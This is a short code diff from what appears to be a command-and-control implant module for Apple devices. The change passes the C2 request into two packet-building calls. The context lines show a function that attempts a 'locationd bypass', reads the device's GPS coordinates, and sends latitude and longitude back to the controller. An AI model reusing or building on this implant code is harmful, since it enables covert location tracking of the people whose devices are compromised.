@@ -133,7 +133,7 @@ tlv_pkt_t *locate_location_get(c2_t *c2)
     if (stat == -1)
     {
         log_debug("* locationd bypass failed with error code (%d)\n", stat);
-        return api_craft_tlv_pkt(API_CALL_FAIL);
+        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
     }
 
     manager = [CLLocationManager sharedManager];
@@ -145,7 +145,7 @@ tlv_pkt_t *locate_location_get(c2_t *c2)
     latitude = [NSString stringWithFormat:@"%f", coordinate.latitude];
     longitude = [NSString stringWithFormat:@"%f", coordinate.longitude];
 
-    result = api_craft_tlv_pkt(API_CALL_SUCCESS);
+    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
 
     tlv_pkt_add_string(result, TLV_TYPE_LATITUDE, (char *)[latitude UTF8String]);
     tlv_pkt_add_string(result, TLV_TYPE_LONGITUDE, (char *)[longitude UTF8String]);
